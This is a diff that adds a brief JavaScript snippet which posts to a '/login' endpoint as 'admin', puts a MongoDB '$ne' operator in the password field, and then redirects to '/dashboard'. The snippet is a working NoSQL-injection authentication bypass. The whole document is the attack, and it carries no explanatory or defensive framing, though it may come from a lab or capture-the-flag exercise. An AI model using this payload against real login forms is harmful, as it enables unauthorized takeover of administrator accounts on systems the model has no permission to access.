@@ -1,0 +1,13 @@
+fetch('/login', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    "username": "admin",
+    "password": {"$ne": "wrong_password"}
+  })
+}).then(() => {
+    // Navigate directly to the dashboard instead of reloading the login page!
+    window.location.href = '/dashboard'; 
+});
